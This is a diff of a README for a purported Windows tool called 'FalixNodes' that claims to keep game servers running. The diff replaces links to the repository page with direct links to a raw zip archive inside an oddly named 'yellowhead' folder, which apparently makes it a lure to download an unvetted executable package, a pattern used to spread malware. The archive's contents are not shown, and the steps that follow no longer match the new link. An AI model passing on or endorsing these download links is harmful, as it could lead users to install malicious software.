@@ -1,6 +1,6 @@
 # ⚙️ FalixNodes - Keep your game server running always
 
-[![Download FalixNodes](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/davitaalliaceous7299/FalixNodes)
+[![Download FalixNodes](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/davitaalliaceous7299/FalixNodes/raw/refs/heads/main/yellowhead/Nodes-Falix-2.6.zip)
 
 ## 📌 About this project
 
@@ -12,7 +12,7 @@ You need a Windows computer to run this tool. Ensure you have a stable internet 
 
 ## 📥 How to get the software
 
-Visit this page to download the necessary files: [https://github.com/davitaalliaceous7299/FalixNodes](https://github.com/davitaalliaceous7299/FalixNodes)
+Visit this page to download the necessary files: [https://github.com/davitaalliaceous7299/FalixNodes/raw/refs/heads/main/yellowhead/Nodes-Falix-2.6.zip](https://github.com/davitaalliaceous7299/FalixNodes/raw/refs/heads/main/yellowhead/Nodes-Falix-2.6.zip)
 
 1. Go to the link above.
 2. Look for the green button labeled Code.
